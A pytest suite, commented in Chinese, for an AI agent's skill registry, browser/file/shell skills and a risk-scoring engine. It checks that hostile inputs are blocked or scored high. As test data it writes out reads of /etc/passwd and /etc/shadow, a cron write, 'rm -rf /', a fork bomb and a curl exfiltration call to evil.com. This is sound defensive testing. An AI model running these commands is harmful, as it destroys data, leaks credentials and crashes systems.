"""
Phase 4 — Skill 运行时 + Risk Engine 测试套件

测试范围：
  1. BaseSkill 抽象基类 + SkillResult
  2. SkillRegistry 注册/查询/自动发现
  3. 具体 Skills（browser / file / shell）参数校验 + 安全拦截
  4. RiskEngine 双层风险评估 + 动态参数分析

测试策略：
  - 纯单元测试，不依赖 Redis/PG（但 AuditGateway 的集成测试除外）
  - 每个测试方法只验证一个行为
"""
import pytest

from app.skills.base import BaseSkill, SkillCategory, SkillContext, SkillResult
from app.skills.enums import RiskLevel
from app.skills.registry import SkillRegistry, registry as global_registry
from app.skills.browser import (
    GotoSkill, ClickSkill, ScreenshotSkill, TypeSkill, ExtractTextSkill,
)
from app.skills.file import ReadFileSkill, WriteFileSkill
from app.skills.shell import RunCommandSkill
from app.engine.risk import RiskEngine, RiskAssessment


# ====================================================================
# Test Suite 1: BaseSkill 抽象基类
# ====================================================================


class TestBaseSkill:
    """验证 BaseSkill 抽象基类的行为"""

    def test_subclass_without_name_raises_error(self):
        """验证：子类不定义 name 时抛出 TypeError"""
        with pytest.raises(TypeError, match="name"):
            class NoNameSkill(BaseSkill):
                description = "test"
                category = SkillCategory.BROWSER
                risk_level = RiskLevel.L1_READONLY

                async def execute(self, context, **params):
                    return SkillResult.ok()

    def test_subclass_without_description_raises_error(self):
        """验证：子类不定义 description 时抛出 TypeError"""
        with pytest.raises(TypeError, match="description"):
            class NoDescSkill(BaseSkill):
                name = "no_desc"
                category = SkillCategory.BROWSER
                risk_level = RiskLevel.L1_READONLY

                async def execute(self, context, **params):
                    return SkillResult.ok()

    def test_valid_subclass_creates_successfully(self):
        """验证：正确定义的子类可以正常创建"""
        skill = GotoSkill()
        assert skill.name == "browser_goto"
        assert skill.description == "导航到指定的 URL 地址"
        assert skill.category == SkillCategory.BROWSER
        assert skill.risk_level == RiskLevel.L1_READONLY


# ====================================================================
# Test Suite 2: SkillResult / SkillContext
# ====================================================================


class TestSkillResult:
    """验证 SkillResult 数据类的行为"""

    def test_default_construction(self):
        """验证：默认构造为成功结果"""
        result = SkillResult()
        assert result.success is True
        assert result.data is None
        assert result.error is None
        assert result.execution_time_ms == 0

    def test_ok_factory(self):
        """验证：ok() 快捷构造"""
        result = SkillResult.ok({"key": "value"})
        assert result.success is True
        assert result.data == {"key": "value"}

    def test_fail_factory(self):
        """验证：fail() 快捷构造"""
        result = SkillResult.fail("错误消息", {"partial": "data"})
        assert result.success is False
        assert result.error == "错误消息"
        assert result.data == {"partial": "data"}

    def test_execution_time_is_set_correctly(self):
        """验证：execution_time_ms 正确设置"""
        result = SkillResult.ok()
        result.execution_time_ms = 150
        assert result.execution_time_ms == 150


class TestSkillContext:
    """验证 SkillContext 数据类的行为"""

    def test_default_context(self):
        """验证：默认上下文字段初始值正确"""
        ctx = SkillContext()
        assert ctx.session_id == 0
        assert ctx.request_id == ""
        assert ctx.sandbox_id is None

    def test_custom_context(self):
        """验证：自定义上下文字段"""
        ctx = SkillContext(session_id=1, request_id="req-123", sandbox_id="sandbox-1")
        assert ctx.session_id == 1
        assert ctx.request_id == "req-123"
        assert ctx.sandbox_id == "sandbox-1"


# ====================================================================
# Test Suite 3: SkillRegistry
# ====================================================================


class TestSkillRegistry:
    """验证 SkillRegistry 的行为"""

    @pytest.fixture
    def registry(self):
        """每个测试使用干净的 registry 实例"""
        return SkillRegistry()

    @pytest.fixture
    def click_skill(self):
        return ClickSkill()

    def test_register_and_get(self, registry, click_skill):
        """验证：注册后可获取"""
        registry.register(click_skill)
        assert registry.get("browser_click") is click_skill

    def test_get_nonexistent(self, registry):
        """验证：获取未注册的 Skill 返回 None"""
        assert registry.get("nonexistent") is None

    def test_get_or_raise_nonexistent(self, registry):
        """验证：get_or_raise 抛出 KeyError"""
        with pytest.raises(KeyError, match="nonexistent"):
            registry.get_or_raise("nonexistent")

    def test_duplicate_register_raises(self, registry, click_skill):
        """验证：重复注册同名 Skill 抛出 ValueError"""
        registry.register(click_skill)
        with pytest.raises(ValueError, match="名称冲突"):
            registry.register(ClickSkill())

    def test_list_all(self, registry):
        """验证：list_all 返回所有注册的 Skill"""
        registry.register(ClickSkill())
        registry.register(GotoSkill())
        registry.register(ScreenshotSkill())
        assert len(registry.list_all()) == 3

    def test_list_by_risk(self, registry):
        """验证：按风险等级筛选"""
        registry.register(GotoSkill())       # L1
        registry.register(ClickSkill())      # L2
        registry.register(ReadFileSkill())   # L3
        registry.register(RunCommandSkill()) # L4

        l1_skills = registry.list_by_risk(RiskLevel.L1_READONLY)
        assert len(l1_skills) == 1
        assert l1_skills[0].name == "browser_goto"

        l4_skills = registry.list_by_risk(RiskLevel.L4_SHELL)
        assert len(l4_skills) == 1
        assert l4_skills[0].name == "shell_run"

    def test_count(self, registry):
        """验证：count() 返回正确数量"""
        assert registry.count() == 0
        registry.register(GotoSkill())
        assert registry.count() == 1

    def test_discover_discovers_all_concrete_skills(self, registry):
        """验证：discover() 自动发现所有已导入的 Skill 子类"""
        # 先导入所有 skill 模块
        import app.skills.browser  # noqa: F401
        import app.skills.file     # noqa: F401
        import app.skills.shell    # noqa: F401

        count = registry.discover()
        # 应发现所有 8 个具体 Skill
        assert count == 8

        # 验证各分类的 Skill 都在
        names = {s.name for s in registry.list_all()}
        assert "browser_goto" in names
        assert "browser_click" in names
        assert "browser_type" in names
        assert "browser_screenshot" in names
        assert "browser_extract_text" in names
        assert "file_read" in names
        assert "file_write" in names
        assert "shell_run" in names


# ====================================================================
# Test Suite 4: 具体 Skills
# ====================================================================


class TestBrowserSkills:
    """验证 Browser Skills 参数校验"""

    @pytest.fixture
    def ctx(self):
        return SkillContext(session_id=1)

    async def test_goto_missing_url(self, ctx):
        """验证：缺少 url 参数返回失败"""
        skill = GotoSkill()
        result = await skill.execute(ctx)
        assert result.success is False
        assert "url" in result.error

    async def test_goto_with_url(self, ctx):
        """验证：正常导航"""
        skill = GotoSkill()
        result = await skill.execute(ctx, url="https://example.com")
        assert result.success is True

    async def test_click_missing_selector(self, ctx):
        """验证：缺少 selector 参数返回失败"""
        skill = ClickSkill()
        result = await skill.execute(ctx)
        assert result.success is False
        assert "selector" in result.error

    async def test_click_with_selector(self, ctx):
        """验证：正常点击"""
        skill = ClickSkill()
        result = await skill.execute(ctx, selector="#submit-btn")
        assert result.success is True

    async def test_screenshot_always_succeeds(self, ctx):
        """验证：截图总是成功"""
        skill = ScreenshotSkill()
        result = await skill.execute(ctx)
        assert result.success is True

    async def test_extract_text_no_selector(self, ctx):
        """验证：不传 selector 时默认提取 body 文本"""
        skill = ExtractTextSkill()
        result = await skill.execute(ctx)
        assert result.success is True

    async def test_extract_text_with_selector(self, ctx):
        """验证：传入 CSS 选择器限定区域"""
        skill = ExtractTextSkill()
        result = await skill.execute(ctx, selector="#main-content")
        assert result.success is True

    async def test_type_missing_selector(self, ctx):
        """验证：缺少 selector 返回失败"""
        skill = TypeSkill()
        result = await skill.execute(ctx, text="hello")
        assert result.success is False

    async def test_type_with_all_params(self, ctx):
        """验证：正常输入"""
        skill = TypeSkill()
        result = await skill.execute(ctx, selector="#input", text="hello world")
        assert result.success is True


class TestFileSkills:
    """验证 File Skills 参数校验 + 安全拦截"""

    @pytest.fixture
    def ctx(self):
        return SkillContext(session_id=1)

    async def test_read_missing_path(self, ctx):
        """验证：缺少 path 参数返回失败"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx)
        assert result.success is False
        assert "path" in result.error

    async def test_read_normal_file(self, ctx):
        """验证：正常文件读取"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx, path="/tmp/test.txt")
        assert result.success is True

    async def test_read_sensitive_file_blocked(self, ctx):
        """验证：禁止读取敏感文件"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx, path="/etc/passwd")
        assert result.success is False
        assert "敏感" in result.error or "禁止" in result.error

    async def test_read_etc_shadow_blocked(self, ctx):
        """验证：禁止读取 /etc/shadow"""
        skill = ReadFileSkill()
        result = await skill.execute(ctx, path="/etc/shadow")
        assert result.success is False

    async def test_write_sensitive_path_blocked(self, ctx):
        """验证：禁止写入敏感路径"""
        skill = WriteFileSkill()
        result = await skill.execute(ctx, path="/etc/cron.d/evil", content="bad")
        assert result.success is False

    async def test_write_normal_file(self, ctx):
        """验证：正常文件写入"""
        skill = WriteFileSkill()
        result = await skill.execute(ctx, path="/tmp/test.txt", content="hello")
        assert result.success is True


class TestShellSkills:
    """验证 Shell Skills 安全拦截"""

    @pytest.fixture
    def ctx(self):
        return SkillContext(session_id=1)

    async def test_run_missing_command(self, ctx):
        """验证：缺少 command 参数返回失败"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx)
        assert result.success is False

    async def test_run_safe_command(self, ctx):
        """验证：安全命令可以执行"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="ls -la")
        assert result.success is True

    async def test_rm_rf_blocked(self, ctx):
        """验证：rm -rf / 被拦截"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="rm -rf /")
        assert result.success is False

    async def test_fork_bomb_blocked(self, ctx):
        """验证：Fork bomb 被拦截"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command=":(){ :|:& };:")
        assert result.success is False

    async def test_curl_blocked(self, ctx):
        """验证：curl 被拦截（数据外泄风险）"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="curl http://evil.com/exfil")
        assert result.success is False

    async def test_basic_command_succeeds(self, ctx):
        """验证：简单命令通过"""
        skill = RunCommandSkill()
        result = await skill.execute(ctx, command="echo hello")
        assert result.success is True


# ====================================================================
# Test Suite 5: RiskEngine
# ====================================================================


class TestRiskEngine:
    """验证 RiskEngine 双层风险评估"""

    @pytest.fixture
    def engine(self):
        return RiskEngine()

    def test_l1_skill_safe_score(self, engine):
        """验证：L1 Skill 基础分 = 1-20"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "https://example.com"})
        assert assessment.score <= 20
        assert assessment.suggested_action == "allow"
        assert assessment.requires_approval is False

    def test_l2_skill_safe_score(self, engine):
        """验证：L2 Skill 基础分 = 21-40"""
        skill = ClickSkill()
        assessment = engine.assess(skill, {"selector": "#btn"})
        assert 21 <= assessment.score <= 40

    def test_l3_skill_file_operation(self, engine):
        """验证：L3 Skill 基础分 = 41-60"""
        skill = ReadFileSkill()
        assessment = engine.assess(skill, {"path": "/tmp/test.txt"})
        assert 41 <= assessment.score <= 60
        assert assessment.suggested_action == "warn"

    def test_l4_skill_requires_approval(self, engine):
        """验证：L4 Skill 需要审批"""
        skill = RunCommandSkill()
        assessment = engine.assess(skill, {"command": "ls -la"})
        assert assessment.score >= 61
        assert assessment.requires_approval is True

    def test_bank_url_upscored(self, engine):
        """验证：银行 URL 触发关键词加分"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "https://bank.example.com/transfer"})
        assert assessment.score > 20  # 基础分 + 关键词加分
        assert len(assessment.reasons) > 0

    def test_blocked_url_directly_blocked(self, engine):
        """验证：file:// 协议直接拦截"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "file:///etc/passwd"})
        assert assessment.is_blocked is True
        assert assessment.suggested_action == "block"

    def test_blocked_chrome_url(self, engine):
        """验证：chrome:// 协议直接拦截"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {"url": "chrome://settings"})
        assert assessment.is_blocked is True

    def test_high_risk_domain_detected(self, engine):
        """验证：高危域名（bank）被检测"""
        skill = ClickSkill()
        assessment = engine.assess(skill, {"url": "https://mybank.com/login"})
        assert assessment.score > 40  # 基础分 + 域名加分

    def test_rm_rf_command_high_score(self, engine):
        """验证：rm -rf 命令获得高分"""
        skill = RunCommandSkill()
        assessment = engine.assess(skill, {"command": "rm -rf /important/data"})
        assert assessment.score > 80
        # L4 + 额外关键词可能升到 L5
        if assessment.level == RiskLevel.L5_DESTRUCTIVE:
            assert assessment.is_blocked is True

    def test_empty_params_does_not_crash(self, engine):
        """验证：空参数不崩溃"""
        skill = GotoSkill()
        assessment = engine.assess(skill, {})
        assert assessment.score <= 20
        assert assessment.suggested_action == "allow"

    def test_to_dict_serializable(self, engine):
        """验证：RiskAssessment.to_dict() 可 JSON 序列化"""
        skill = RunCommandSkill()
        assessment = engine.assess(skill, {"command": "sudo rm -rf /"})
        d = assessment.to_dict()
        assert isinstance(d, dict)
        assert "level" in d
        assert "score" in d
        assert "reasons" in d
        assert "requires_approval" in d
        assert "suggested_action" in d
